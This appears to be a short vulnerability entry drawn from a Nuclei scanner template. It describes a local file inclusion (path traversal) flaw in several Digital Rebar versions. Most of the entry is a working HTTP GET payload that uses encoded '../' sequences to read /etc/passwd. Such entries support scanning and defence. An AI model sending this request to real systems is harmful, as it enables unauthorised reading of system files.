# Vulnerability: Digital Rebar - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`digitalrebar-traversal.yaml`)

## Description
Digital Rebar versions 4.3.0, 4.3.2, 4.3.3, 4.4.0, and maybe others are vulnerable to local file inclusion because web requests can navigate outside of DRP controlled areas.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

